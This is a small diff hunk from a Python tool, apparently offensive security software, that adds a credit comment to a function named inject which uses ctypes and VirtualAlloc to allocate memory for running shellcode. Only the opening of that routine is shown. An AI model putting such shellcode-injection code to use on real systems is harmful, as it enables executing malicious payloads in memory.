@@ -27,6 +27,7 @@ import select
 
 # define our shellcode injection code through ctypes
 def inject(shellcode):
+    # special thanks to Debasish Mandal (http://www.debasish.in/2012_04_01_archive.html)
     ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                               ctypes.c_int(len(shellcode)),
                                               ctypes.c_int(0x3000),
